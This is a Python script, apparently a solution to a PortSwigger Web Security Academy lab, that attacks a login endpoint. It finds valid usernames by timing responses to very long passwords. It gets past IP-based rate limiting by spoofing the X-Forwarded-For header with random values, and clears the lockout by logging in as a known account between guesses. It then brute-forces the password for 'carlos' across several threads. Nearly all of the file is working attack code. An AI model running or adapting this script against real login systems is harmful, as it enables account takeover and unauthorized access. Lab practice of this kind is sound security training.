from random import random
import requests
import html
import random
from threading import Thread
import time


def getHeader(iter):
    return {'content-type': 'application/x-www-form-urlencoded', 'Accept-Charset': 'UTF-8',  'X-Forwarded-For':str(iter)}

url = 'https://0a1e008004b4911bc08148df007800ce.web-security-academy.net/login'
defaultCookies = { 
    "session":"PXwRyr67bG2xIwTlKgDyLblmhOiB5TPD"
}

def getUserPayload(name):
    return {
        "username": str(name),
        "password": "x"*1000
    }

def getPasswordPayload(name, password):
     return {
        "username": str(name),
        "password": str(password)
    }

def getUsername():
    with open('userList.txt') as file:
        
        for line in file:
            ranNum = random.randint(1, 1000)
            user = line.rstrip()
            payload = getUserPayload(user)

            r = requests.post(url, data=payload, headers=getHeader(ranNum), cookies=defaultCookies)
            print('Probando con: %s' % (user))
            if(r.elapsed.total_seconds() > 4):
                print('el usuario es correcto: %s' % (user))
                f = open('index.html', 'w')
                f.write(html.unescape(r.text))
                f.close()
                break

def resetBlock():
    data = {
        "username":"wiener",
        "password":"peter",
    }
    requests.post(url, data=data, headers=getHeader(1), cookies=defaultCookies)

def divideList(my_list, numTasks):
    listOfWordlists = []
    for i in range(numTasks):
        listOfWordlists.append(my_list[i::numTasks])

    return listOfWordlists
    


def getPassword(passwordsList):
    resetBlock()
    user = "carlos"
    for password in passwordsList:
        ranNum = random.randint(1, 1000)
        payload = getPasswordPayload(user, password)

        r = requests.post(url, data=payload, headers=getHeader(ranNum), cookies=defaultCookies)
        print('Probando con: %s' % (password))
        if( "You have made too many incorrect login attempts" in r.text ):
            print('Bloqueo de IP')
            break
        if(not ("<p class=is-warning>Incorrect password</p>" in r.text) ):
            f = open('index.html', 'w')
            f.write(html.unescape(r.text))
            f.close()
            print('el usuario es correcto: %s' % (user))
            print('La contraseña es: %s' % (password))
            break
        
        
        resetBlock()
            

def test(list):
    print(list)

def main(numTasks):
    file = open('pwdList.txt')
    lines = file.read().splitlines()    
    file.close()
    listOfWordlists = divideList(lines,numTasks)
    for i in range(numTasks):
        task = Thread(target=getPassword, args=[listOfWordlists[i]])
        task.daemon = True
        task.start()

    while True:
        time.sleep(1)
        

main(3)

#t1 = Thread(target=processLine, args=[dRecieved])
